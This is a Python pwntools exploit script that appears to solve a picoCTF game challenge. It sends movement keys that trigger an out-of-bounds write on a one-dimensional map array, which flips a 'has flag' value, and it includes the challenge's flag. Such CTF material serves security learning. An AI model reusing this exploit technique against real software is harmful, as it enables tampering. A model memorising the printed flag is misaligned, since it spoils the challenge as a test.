from pwn import *
from grwnapy.pwn import find_offset


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

io = start()

payload = flat([
    b"w"*4,
    b"a"*8,
    b"p"
])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()

"""
This is an index out of bound exploit, because the array used for the map is one dimensional.
When you go to the very edge of the map (top-left) and move the character further, pointers beyond the array gets written to.
By going 4-bytes beyond, you will change the "has flag" value to a non-zero value. Therefore revealing the flag once you get to the finish line.

Note:
w a s d - movement
l - put player on coords
p - instantly win

picoCTF{gamer_m0d3_enabled_f4f6ad7d}
"""
